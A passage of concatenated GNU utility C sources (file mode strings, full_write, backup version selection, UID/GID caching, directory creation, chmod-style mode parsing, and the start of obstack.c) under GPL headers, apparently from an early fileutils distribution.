#define S_ISSOCK(m) (((m) & S_IFMT) == S_IFSOCK)
#endif
#if !defined(S_ISMPB) && defined(S_IFMPB) /* V7 */
#define S_ISMPB(m) (((m) & S_IFMT) == S_IFMPB)
#define S_ISMPC(m) (((m) & S_IFMT) == S_IFMPC)
#endif
#if !defined(S_ISNWK) && defined(S_IFNWK) /* HP/UX */
#define S_ISNWK(m) (((m) & S_IFMT) == S_IFNWK)
#endif

void mode_string ();
static char ftypelet ();
static void rwx ();
static void setst ();

/* filemodestring - fill in string STR with an ls-style ASCII
   representation of the st_mode field of file stats block STATP.
   10 characters are stored in STR; no terminating null is added.
   The characters stored in STR are:

   0	File type.  'd' for directory, 'c' for character
	special, 'b' for block special, 'm' for multiplex,
	'l' for symbolic link, 's' for socket, 'p' for fifo,
	'-' for regular, '?' for any other file type

   1	'r' if the owner may read, '-' otherwise.

   2	'w' if the owner may write, '-' otherwise.

   3	'x' if the owner may execute, 's' if the file is
	set-user-id, '-' otherwise.
	'S' if the file is set-user-id, but the execute
	bit isn't set.

   4	'r' if group members may read, '-' otherwise.

   5	'w' if group members may write, '-' otherwise.

   6	'x' if group members may execute, 's' if the file is
	set-group-id, '-' otherwise.
	'S' if it is set-group-id but not executable.

   7	'r' if any user may read, '-' otherwise.

   8	'w' if any user may write, '-' otherwise.

   9	'x' if any user may execute, 't' if the file is "sticky"
	(will be retained in swap space after execution), '-'
	otherwise.
	'T' if the file is sticky but not executable.  */

void
filemodestring (statp, str)
     struct stat *statp;
     char *str;
{
  mode_string (statp->st_mode, str);
}

/* Like filemodestring, but only the relevant part of the `struct stat'
   is given as an argument.  */

void
mode_string (mode, str)
     unsigned short mode;
     char *str;
{
  str[0] = ftypelet ((long) mode);
  rwx ((mode & 0700) << 0, &str[1]);
  rwx ((mode & 0070) << 3, &str[4]);
  rwx ((mode & 0007) << 6, &str[7]);
  setst (mode, str);
}

/* Return a character indicating the type of file described by
   file mode BITS:
   'd' for directories
   'b' for block special files
   'c' for character special files
   'm' for multiplexor files
   'l' for symbolic links
   's' for sockets
   'p' for fifos
   '-' for regular files
   '?' for any other file type.  */

static char
ftypelet (bits)
     long bits;
{
#ifdef S_ISBLK
  if (S_ISBLK (bits))
    return 'b';
#endif
  if (S_ISCHR (bits))
    return 'c';
  if (S_ISDIR (bits))
    return 'd';
  if (S_ISREG (bits))
    return '-';
#ifdef S_ISFIFO
  if (S_ISFIFO (bits))
    return 'p';
#endif
#ifdef S_ISLNK
  if (S_ISLNK (bits))
    return 'l';
#endif
#ifdef S_ISSOCK
  if (S_ISSOCK (bits))
    return 's';
#endif
#ifdef S_ISMPC
  if (S_ISMPC (bits))
    return 'm';
#endif
#ifdef S_ISNWK
  if (S_ISNWK (bits))
    return 'n';
#endif
  return '?';
}

/* Look at read, write, and execute bits in BITS and set
   flags in CHARS accordingly.  */

static void
rwx (bits, chars)
     unsigned short bits;
     char *chars;
{
  chars[0] = (bits & S_IRUSR) ? 'r' : '-';
  chars[1] = (bits & S_IWUSR) ? 'w' : '-';
  chars[2] = (bits & S_IXUSR) ? 'x' : '-';
}

/* Set the 's' and 't' flags in file attributes string CHARS,
   according to the file mode BITS.  */

static void
setst (bits, chars)
     unsigned short bits;
     char *chars;
{
#ifdef S_ISUID
  if (bits & S_ISUID)
    {
      if (chars[3] != 'x')
	/* Set-uid, but not executable by owner.  */
	chars[3] = 'S';
      else
	chars[3] = 's';
    }
#endif
#ifdef S_ISGID
  if (bits & S_ISGID)
    {
      if (chars[6] != 'x')
	/* Set-gid, but not executable by group.  */
	chars[6] = 'S';
      else
	chars[6] = 's';
    }
#endif
#ifdef S_ISVTX
  if (bits & S_ISVTX)
    {
      if (chars[9] != 'x')
	/* Sticky, but not executable by others.  */
	chars[9] = 'T';
      else
	chars[9] = 't';
    }
#endif
}
/* full-write.c -- an interface to write that retries after interrupts
   Copyright (C) 1993, 1994 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

   Copied largely from GNU C's cccp.c.
   */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#include <errno.h>
#ifndef errno
extern int errno;
#endif

/* Write LEN bytes at PTR to descriptor DESC, retrying if interrupted.
   Return LEN upon success, write's (negative) error code otherwise.  */

int
full_write (desc, ptr, len)
     int desc;
     char *ptr;
     size_t len;
{
  int total_written;

  total_written = 0;
  while (len > 0)
    {
      int written = write (desc, ptr, len);
      if (written < 0)
	{
#ifdef EINTR
	  if (errno == EINTR)
	    continue;
#endif
	  return written;
	}
      total_written += written;
      ptr += written;
      len -= written;
    }
  return total_written;
}
/* getversion.c -- select backup filename type
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu> */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include "backupfile.h"

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

int argmatch ();
void invalid_arg ();

extern char *program_name;

static char *backup_args[] =
{
  "never", "simple", "nil", "existing", "t", "numbered", 0
};

static enum backup_type backup_types[] =
{
  simple, simple, numbered_existing, numbered_existing, numbered, numbered
};

/* Return the type of backup indicated by VERSION.
   Unique abbreviations are accepted. */

enum backup_type
get_version (version)
     char *version;
{
  int i;

  if (version == 0 || *version == 0)
    return numbered_existing;
  i = argmatch (version, backup_args);
  if (i >= 0)
    return backup_types[i];
  invalid_arg ("version control type", version, i);
  exit (1);
}
/* idcache.c -- map user and group IDs, cached for speed
   Copyright (C) 1985, 1988, 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>

#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif
#ifndef _POSIX_VERSION
struct passwd *getpwuid ();
struct passwd *getpwnam ();
struct group *getgrgid ();
struct group *getgrnam ();
#endif

char *xmalloc ();
char *xstrdup ();

struct userid
{
  union
    {
      uid_t u;
      gid_t g;
    } id;
  char *name;
  struct userid *next;
};

static struct userid *user_alist;

/* The members of this list have names not in the local passwd file.  */
static struct userid *nouser_alist;

/* Translate UID to a login name or a stringified number,
   with cache.  */

char *
getuser (uid)
     uid_t uid;
{
  register struct userid *tail;
  struct passwd *pwent;
  char usernum_string[20];

  for (tail = user_alist; tail; tail = tail->next)
    if (tail->id.u == uid)
      return tail->name;

  pwent = getpwuid (uid);
  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->id.u = uid;
  if (pwent == 0)
    {
      sprintf (usernum_string, "%u", (unsigned) uid);
      tail->name = xstrdup (usernum_string);
    }
  else
    tail->name = xstrdup (pwent->pw_name);

  /* Add to the head of the list, so most recently used is first.  */
  tail->next = user_alist;
  user_alist = tail;
  return tail->name;
}

/* Translate USER to a UID, with cache.
   Return NULL if there is no such user.
   (We also cache which user names have no passwd entry,
   so we don't keep looking them up.)  */

uid_t *
getuidbyname (user)
     char *user;
{
  register struct userid *tail;
  struct passwd *pwent;

  for (tail = user_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *user && !strcmp (tail->name, user))
      return &tail->id.u;

  for (tail = nouser_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *user && !strcmp (tail->name, user))
      return 0;

  pwent = getpwnam (user);

  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->name = xstrdup (user);

  /* Add to the head of the list, so most recently used is first.  */
  if (pwent)
    {
      tail->id.u = pwent->pw_uid;
      tail->next = user_alist;
      user_alist = tail;
      return &tail->id.u;
    }

  tail->next = nouser_alist;
  nouser_alist = tail;
  return 0;
}

/* Use the same struct as for userids.  */
static struct userid *group_alist;
static struct userid *nogroup_alist;

/* Translate GID to a group name or a stringified number,
   with cache.  */

char *
getgroup (gid)
     gid_t gid;
{
  register struct userid *tail;
  struct group *grent;
  char groupnum_string[20];

  for (tail = group_alist; tail; tail = tail->next)
    if (tail->id.g == gid)
      return tail->name;

  grent = getgrgid (gid);
  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->id.g = gid;
  if (grent == 0)
    {
      sprintf (groupnum_string, "%u", (unsigned int) gid);
      tail->name = xstrdup (groupnum_string);
    }
  else
    tail->name = xstrdup (grent->gr_name);

  /* Add to the head of the list, so most recently used is first.  */
  tail->next = group_alist;
  group_alist = tail;
  return tail->name;
}

/* Translate GROUP to a UID, with cache.
   Return NULL if there is no such group.
   (We also cache which group names have no group entry,
   so we don't keep looking them up.)  */

gid_t *
getgidbyname (group)
     char *group;
{
  register struct userid *tail;
  struct group *grent;

  for (tail = group_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *group && !strcmp (tail->name, group))
      return &tail->id.g;

  for (tail = nogroup_alist; tail; tail = tail->next)
    /* Avoid a function call for the most common case.  */
    if (*tail->name == *group && !strcmp (tail->name, group))
      return 0;

  grent = getgrnam (group);

  tail = (struct userid *) xmalloc (sizeof (struct userid));
  tail->name = xstrdup (group);

  /* Add to the head of the list, so most recently used is first.  */
  if (grent)
    {
      tail->id.g = grent->gr_gid;
      tail->next = group_alist;
      group_alist = tail;
      return &tail->id.g;
    }

  tail->next = nogroup_alist;
  nogroup_alist = tail;
  return 0;
}
/* isdir.c -- determine whether a directory exists
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

/* If PATH is an existing directory or symbolic link to a directory,
   return nonzero, else 0.  */

int
isdir (path)
     char *path;
{
  struct stat stats;

  return stat (path, &stats) == 0 && S_ISDIR (stats.st_mode);
}
/* Utility to accept --help and --version options as unobtrusively as possible.
   Copyright (C) 1993, 1994 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Jim Meyering (meyering@comco.com) */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <getopt.h>
#include "long-options.h"

static struct option const long_options[] =
{
  {"help", no_argument, 0, 'h'},
  {"version", no_argument, 0, 'v'},
  {0, 0, 0, 0}
};

/* Process long options --help and --version, but only if argc == 2.
   Be careful not to gobble up `--'.  */

void
parse_long_options (argc, argv, command_name, version_string, usage)
     int argc;
     char **argv;
     const char *command_name;
     const char *version_string;
     void (*usage)();
{
  int c;
  int saved_opterr;
  int saved_optind;

  saved_opterr = opterr;
  saved_optind = optind;

  /* Don't print an error message for unrecognized options.  */
  opterr = 0;

  if (argc == 2
      && (c = getopt_long (argc, argv, "+", long_options, (int *) 0)) != EOF)
    {
      switch (c)
	{
	case 'h':
	  (*usage) (0);

	case 'v':
	  printf ("%s - %s\n", command_name, version_string);
	  exit (0);
	
	default:
	  /* Don't process any other long-named options.  */
	  break;
	}
    }

  /* Restore previous value.  */
  opterr = saved_opterr;

  /* Restore optind in case it has advanced past a leading `--'.  */
  optind = saved_optind;
}
/* makepath.c -- Ensure that a directory path exists.
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu> and
   Jim Meyering <meyering@cs.utexas.edu>.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef __GNUC__
#define alloca __builtin_alloca
#else
#ifdef HAVE_ALLOCA_H
#include <alloca.h>
#else
#ifdef _AIX
 #pragma alloca
#else
char *alloca ();
#endif
#endif
#endif

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_ERRNO_H
#include <errno.h>
#endif

#ifndef errno
extern int errno;
#endif

#ifdef HAVE_STRING_H
# include <string.h>
#else
# include <strings.h>
# ifndef strchr
#  define strchr index
# endif
#endif

#ifdef __MSDOS__
typedef int uid_t;
typedef int gid_t;
#endif

#include "makepath.h"

void error ();

/* Ensure that the directory ARGPATH exists.
   Remove any trailing slashes from ARGPATH before calling this function.

   Create any leading directories that don't already exist, with
   permissions PARENT_MODE.
   If the last element of ARGPATH does not exist, create it as
   a new directory with permissions MODE.
   If OWNER and GROUP are non-negative, use them to set the UID and GID of
   any created directories.
   If VERBOSE_FMT_STRING is nonzero, use it as a printf format
   string for printing a message after successfully making a directory,
   with the name of the directory that was just made as an argument.
   If PRESERVE_EXISTING is non-zero and ARGPATH is an existing directory,
   then do not attempt to set its permissions and ownership.

   Return 0 if ARGPATH exists as a directory with the proper
   ownership and permissions when done, otherwise 1.  */

#if __STDC__
int
make_path (const char *argpath,
	   int mode,
	   int parent_mode,
	   uid_t owner,
	   gid_t group,
	   int preserve_existing,
	   const char *verbose_fmt_string)
#else
int
make_path (argpath, mode, parent_mode, owner, group, preserve_existing,
	   verbose_fmt_string)
     const char *argpath;
     int mode;
     int parent_mode;
     uid_t owner;
     gid_t group;
     int preserve_existing;
     const char *verbose_fmt_string;
#endif
{
  char *dirpath;		/* A copy we can scribble NULs on.  */
  struct stat stats;
  int retval = 0;
  int oldmask = umask (0);

  /* FIXME: move this alloca and strcpy into the if-block.
     Set dirpath to argpath in the else-block.  */
  dirpath = (char *) alloca (strlen (argpath) + 1);
  strcpy (dirpath, argpath);

  if (stat (dirpath, &stats))
    {
      char *slash;
      int tmp_mode;		/* Initial perms for leading dirs.  */
      int re_protect;		/* Should leading dirs be unwritable? */
      struct ptr_list
      {
	char *dirname_end;
	struct ptr_list *next;
      };
      struct ptr_list *p, *leading_dirs = NULL;

      /* If leading directories shouldn't be writable or executable,
	 or should have set[ug]id or sticky bits set and we are setting
	 their owners, we need to fix their permissions after making them.  */
      if (((parent_mode & 0300) != 0300)
	  || (owner != (uid_t) -1 && group != (gid_t) -1
	      && (parent_mode & 07000) != 0))
	{
	  tmp_mode = 0700;
	  re_protect = 1;
	}
      else
	{
	  tmp_mode = parent_mode;
	  re_protect = 0;
	}

      slash = dirpath;
      while (*slash == '/')
	slash++;
      while ((slash = strchr (slash, '/')))
	{
	  *slash = '\0';
	  if (stat (dirpath, &stats))
	    {
	      if (mkdir (dirpath, tmp_mode))
		{
		  error (0, errno, "cannot create directory `%s'", dirpath);
		  umask (oldmask);
		  return 1;
		}
	      else
		{
		  if (verbose_fmt_string != NULL)
		    error (0, 0, verbose_fmt_string, dirpath);

		  if (owner != (uid_t) -1 && group != (gid_t) -1
		      && chown (dirpath, owner, group)
#if defined(AFS) && defined (EPERM)
		      && errno != EPERM
#endif
		      )
		    {
		      error (0, errno, "%s", dirpath);
		      retval = 1;
		    }
		  if (re_protect)
		    {
		      struct ptr_list *new = (struct ptr_list *)
			alloca (sizeof (struct ptr_list));
		      new->dirname_end = slash;
		      new->next = leading_dirs;
		      leading_dirs = new;
		    }
		}
	    }
	  else if (!S_ISDIR (stats.st_mode))
	    {
	      error (0, 0, "`%s' exists but is not a directory", dirpath);
	      umask (oldmask);
	      return 1;
	    }

	  *slash++ = '/';

	  /* Avoid unnecessary calls to `stat' when given
	     pathnames containing multiple adjacent slashes.  */
	  while (*slash == '/')
	    slash++;
	}

      /* We're done making leading directories.
	 Create the final component of the path.  */

      /* The path could end in "/." or contain "/..", so test
	 if we really have to create the directory.  */

      if (stat (dirpath, &stats) && mkdir (dirpath, mode))
	{
	  error (0, errno, "cannot create directory `%s'", dirpath);
	  umask (oldmask);
	  return 1;
	}
      if (verbose_fmt_string != NULL)
	error (0, 0, verbose_fmt_string, dirpath);

      if (owner != (uid_t) -1 && group != (gid_t) -1)
	{
	  if (chown (dirpath, owner, group)
#ifdef AFS
	      && errno != EPERM
#endif
	      )
	    {
	      error (0, errno, "%s", dirpath);
	      retval = 1;
	    }
	  /* chown may have turned off some permission bits we wanted.  */
	  if ((mode & 07000) != 0 && chmod (dirpath, mode))
	    {
	      error (0, errno, "%s", dirpath);
	      retval = 1;
	    }
	}

      /* If the mode for leading directories didn't include owner "wx"
	 privileges, we have to reset their protections to the correct
	 value.  */
      for (p = leading_dirs; p != NULL; p = p->next)
	{
	  *(p->dirname_end) = '\0';
	  if (chmod (dirpath, parent_mode))
	    {
	      error (0, errno, "%s", dirpath);
	      retval = 1;
	    }
	}
    }
  else
    {
      /* We get here if the entire path already exists.  */

      if (!S_ISDIR (stats.st_mode))
	{
	  error (0, 0, "`%s' exists but is not a directory", dirpath);
	  umask (oldmask);
	  return 1;
	}

      if (!preserve_existing)
	{
	  /* chown must precede chmod because on some systems,
	     chown clears the set[ug]id bits for non-superusers,
	     resulting in incorrect permissions.
	     On System V, users can give away files with chown and then not
	     be able to chmod them.  So don't give files away.  */

	  if (owner != (uid_t) -1 && group != (gid_t) -1
	      && chown (dirpath, owner, group)
#ifdef AFS
	      && errno != EPERM
#endif
	      )
	    {
	      error (0, errno, "%s", dirpath);
	      retval = 1;
	    }
	  if (chmod (dirpath, mode))
	    {
	      error (0, errno, "%s", dirpath);
	      retval = 1;
	    }
	}
    }

  umask (oldmask);
  return retval;
}
/* modechange.c -- file mode manipulation
   Copyright (C) 1989, 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@ai.mit.edu> */

/* The ASCII mode string is compiled into a linked list of `struct
   modechange', which can then be applied to each file to be changed.
   We do this instead of re-parsing the ASCII string for each file
   because the compiled form requires less computation to use; when
   changing the mode of many files, this probably results in a
   performance gain. */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include "modechange.h"

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *malloc ();
#endif

#ifndef NULL
#define NULL 0
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISDIR
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif

/* Return newly allocated memory to hold one element of type TYPE. */
#define talloc(type) ((type *) malloc (sizeof (type)))

#define isodigit(c) ((c) >= '0' && (c) <= '7')

static int oatoi ();

/* Return a linked list of file mode change operations created from
   MODE_STRING, an ASCII string that contains either an octal number
   specifying an absolute mode, or symbolic mode change operations with
   the form:
   [ugoa...][[+-=][rwxXstugo...]...][,...]
   MASKED_OPS is a bitmask indicating which symbolic mode operators (=+-)
   should not affect bits set in the umask when no users are given.
   Operators not selected in MASKED_OPS ignore the umask.

   Return MODE_INVALID if `mode_string' does not contain a valid
   representation of file mode change operations;
   return MODE_MEMORY_EXHAUSTED if there is insufficient memory. */

struct mode_change *
mode_compile (mode_string, masked_ops)
     const char *mode_string;
     unsigned masked_ops;
{
  struct mode_change *head;	/* First element of the linked list. */
  struct mode_change *change;	/* An element of the linked list. */
  int i;			/* General purpose temporary. */
  int umask_value;		/* The umask value (surprise). */
  unsigned short affected_bits;	/* Which bits in the mode are operated on. */
  unsigned short affected_masked; /* `affected_bits' modified by umask. */
  unsigned ops_to_mask;		/* Operators to actually use umask on. */

  i = oatoi (mode_string);
  if (i >= 0)
    {
      if (i > 07777)
	return MODE_INVALID;
      head = talloc (struct mode_change);
      if (head == NULL)
	return MODE_MEMORY_EXHAUSTED;
      head->next = NULL;
      head->op = '=';
      head->flags = 0;
      head->value = i;
      head->affected = 07777;	/* Affect all permissions. */
      return head;
    }

  umask_value = umask (0);
  umask (umask_value);		/* Restore the old value. */

  head = NULL;
#ifdef lint
  change = NULL;
#endif
  --mode_string;

  /* One loop iteration for each "ugoa...=+-rwxXstugo...[=+-rwxXstugo...]". */
  do
    {
      affected_bits = 0;
      ops_to_mask = 0;
      /* Turn on all the bits in `affected_bits' for each group given. */
      for (++mode_string;; ++mode_string)
	switch (*mode_string)
	  {
	  case 'u':
	    affected_bits |= 04700;
	    break;
	  case 'g':
	    affected_bits |= 02070;
	    break;
	  case 'o':
	    affected_bits |= 01007;
	    break;
	  case 'a':
	    affected_bits |= 07777;
	    break;
	  default:
	    goto no_more_affected;
	  }

    no_more_affected:
      /* If none specified, affect all bits, except perhaps those
	 set in the umask. */
      if (affected_bits == 0)
	{
	  affected_bits = 07777;
	  ops_to_mask = masked_ops;
	}

      while (*mode_string == '=' || *mode_string == '+' || *mode_string == '-')
	{
	  /* Add the element to the tail of the list, so the operations
	     are performed in the correct order. */
	  if (head == NULL)
	    {
	      head = talloc (struct mode_change);
	      if (head == NULL)
		return MODE_MEMORY_EXHAUSTED;
	      change = head;
	    }
	  else
	    {
	      change->next = talloc (struct mode_change);
	      if (change->next == NULL)
		{
		  mode_free (change);
		  return MODE_MEMORY_EXHAUSTED;
		}
	      change = change->next;
	    }

	  change->next = NULL;
	  change->op = *mode_string;	/* One of "=+-". */
	  affected_masked = affected_bits;
	  if (ops_to_mask & (*mode_string == '=' ? MODE_MASK_EQUALS
			     : *mode_string == '+' ? MODE_MASK_PLUS
			     : MODE_MASK_MINUS))
	    affected_masked &= ~umask_value;
	  change->affected = affected_masked;
	  change->value = 0;
	  change->flags = 0;

	  /* Set `value' according to the bits set in `affected_masked'. */
	  for (++mode_string;; ++mode_string)
	    switch (*mode_string)
	      {
	      case 'r':
		change->value |= 00444 & affected_masked;
		break;
	      case 'w':
		change->value |= 00222 & affected_masked;
		break;
	      case 'X':
		change->flags |= MODE_X_IF_ANY_X;
		/* Fall through. */
	      case 'x':
		change->value |= 00111 & affected_masked;
		break;
	      case 's':
		/* Set the setuid/gid bits if `u' or `g' is selected. */
		change->value |= 06000 & affected_masked;
		break;
	      case 't':
		/* Set the "save text image" bit if `o' is selected. */
		change->value |= 01000 & affected_masked;
		break;
	      case 'u':
		/* Set the affected bits to the value of the `u' bits
		   on the same file.  */
		if (change->value)
		  goto invalid;
		change->value = 00700;
		change->flags |= MODE_COPY_EXISTING;
		break;
	      case 'g':
		/* Set the affected bits to the value of the `g' bits
		   on the same file.  */
		if (change->value)
		  goto invalid;
		change->value = 00070;
		change->flags |= MODE_COPY_EXISTING;
		break;
	      case 'o':
		/* Set the affected bits to the value of the `o' bits
		   on the same file.  */
		if (change->value)
		  goto invalid;
		change->value = 00007;
		change->flags |= MODE_COPY_EXISTING;
		break;
	      default:
		goto no_more_values;
	      }
	no_more_values:;
	}
  } while (*mode_string == ',');
  if (*mode_string == 0)
    return head;
invalid:
  mode_free (head);
  return MODE_INVALID;
}

/* Return file mode OLDMODE, adjusted as indicated by the list of change
   operations CHANGES.  If OLDMODE is a directory, the type `X'
   change affects it even if no execute bits were set in OLDMODE.
   The returned value has the S_IFMT bits cleared. */

unsigned short
mode_adjust (oldmode, changes)
     unsigned oldmode;
     const struct mode_change *changes;
{
  unsigned short newmode;	/* The adjusted mode and one operand. */
  unsigned short value;		/* The other operand. */

  newmode = oldmode & 07777;

  for (; changes; changes = changes->next)
    {
      if (changes->flags & MODE_COPY_EXISTING)
	{
	  /* Isolate in `value' the bits in `newmode' to copy, given in
	     the mask `changes->value'. */
	  value = newmode & changes->value;

	  if (changes->value & 00700)
	    /* Copy `u' permissions onto `g' and `o'. */
	    value |= (value >> 3) | (value >> 6);
	  else if (changes->value & 00070)
	    /* Copy `g' permissions onto `u' and `o'. */
	    value |= (value << 3) | (value >> 3);
	  else
	    /* Copy `o' permissions onto `u' and `g'. */
	    value |= (value << 3) | (value << 6);

	  /* In order to change only `u', `g', or `o' permissions,
	     or some combination thereof, clear unselected bits.
	     This can not be done in mode_compile because the value
	     to which the `changes->affected' mask is applied depends
	     on the old mode of each file. */
	  value &= changes->affected;
	}
      else
	{
	  value = changes->value;
	  /* If `X', do not affect the execute bits if the file is not a
	     directory and no execute bits are already set. */
	  if ((changes->flags & MODE_X_IF_ANY_X)
	      && !S_ISDIR (oldmode)
	      && (newmode & 00111) == 0)
	    value &= ~00111;	/* Clear the execute bits. */
	}

      switch (changes->op)
	{
	case '=':
	  /* Preserve the previous values in `newmode' of bits that are
	     not affected by this change operation. */
	  newmode = (newmode & ~changes->affected) | value;
	  break;
	case '+':
	  newmode |= value;
	  break;
	case '-':
	  newmode &= ~value;
	  break;
	}
    }
  return newmode;
}

/* Free the memory used by the list of file mode change operations
   CHANGES. */

void
mode_free (changes)
     register struct mode_change *changes;
{
  register struct mode_change *next;

  while (changes)
    {
      next = changes->next;
      free (changes);
      changes = next;
    }
}

/* Return a positive integer containing the value of the ASCII
   octal number S.  If S is not an octal number, return -1.  */

static int
oatoi (s)
     char *s;
{
  register int i;

  if (*s == 0)
    return -1;
  for (i = 0; isodigit (*s); ++s)
    i = i * 8 + *s - '0';
  if (*s)
    return -1;
  return i;
}
/* obstack.c - subroutines used implicitly by object stack macros
   Copyright (C) 1988, 89, 90, 91, 92, 93, 94 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#include "obstack.h"

/* This is just to get __GNU_LIBRARY__ defined.  */
#include <stdio.h>

/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


#if defined (__STDC__) && __STDC__
#define POINTER void *
#else
#define POINTER char *
#endif

/* Determine default alignment.  */
struct fooalign {char x; double d;};
#define DEFAULT_ALIGNMENT  \
  ((PTR_INT_TYPE) ((char *)&((struct fooalign *) 0)->d - (char *)0))
/* If malloc were really smart, it would round addresses to DEFAULT_ALIGNMENT.
   But in fact it might be less smart and round addresses to as much as
